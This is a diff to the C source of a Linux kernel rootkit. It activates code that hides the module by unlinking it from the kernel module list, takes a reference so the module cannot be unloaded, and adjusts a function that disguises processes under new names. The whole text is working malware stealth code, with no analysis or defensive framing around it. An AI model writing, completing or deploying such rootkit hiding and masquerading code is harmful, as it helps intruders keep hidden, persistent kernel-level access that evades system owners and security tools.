@@ -34,27 +34,28 @@ static int rootkit_release(struct inode *inode, struct file *filp) {
     return 0;
 }
 
-// /* The rootkit module should be visible by default. */
-// static bool module_hidden = false; // default : visible (not hidden)
-// static struct list_head *prev_entry = NULL;
+/* The rootkit module should be visible by default. */
+static bool module_hidden = false;
+static struct list_head *prev_module_entry = NULL;
 
-// static void toggle_module_visibility(void) {
-//     if (!module_hidden) {
-//         prev_entry = THIS_MODULE->list.prev;
-//         try_module_get(THIS_MODULE); // Prevent unloading
-//         // Hide module: remove from list
-//         list_del(&THIS_MODULE->list);
-//         module_hidden = true;
+static void toggle_module_visibility(void) {
+    if (!module_hidden) {
+        prev_module_entry = THIS_MODULE->list.prev;
+        try_module_get(THIS_MODULE); // Prevent unloading
+        // Hide module: remove from list
+        list_del(&THIS_MODULE->list);
+        module_hidden = true;
         
-//         printk(KERN_INFO "Module hidden\n");
-//     } else {
-//         if (prev_entry)
-//             list_add(&THIS_MODULE->list, prev_entry);
-//         module_hidden = false;
-//         module_put(THIS_MODULE); // Balance reference count
-//         printk(KERN_INFO "Module unhidden\n");
-//     }
-// }
+        printk(KERN_INFO "Module hidden\n");
+    } else {
+        if (prev_module_entry)
+            list_add(&THIS_MODULE->list, prev_module_entry);
+        module_hidden = false;
+        module_put(THIS_MODULE); // Balance reference count
+
+        printk(KERN_INFO "Module unhidden\n");
+    }
+}
 
 static void masquerade_proc(struct masq_proc *proc) {
     struct task_struct *task;
@@ -63,6 +64,7 @@ static void masquerade_proc(struct masq_proc *proc) {
 
     // new name must be shorter than original name
     if (strnlen(new_name, MASQ_LEN) >= strnlen(orig_name, MASQ_LEN)) {
+        printk(KERN_WARNING "New name must be shorter than original name\n");
         return;
     }
 
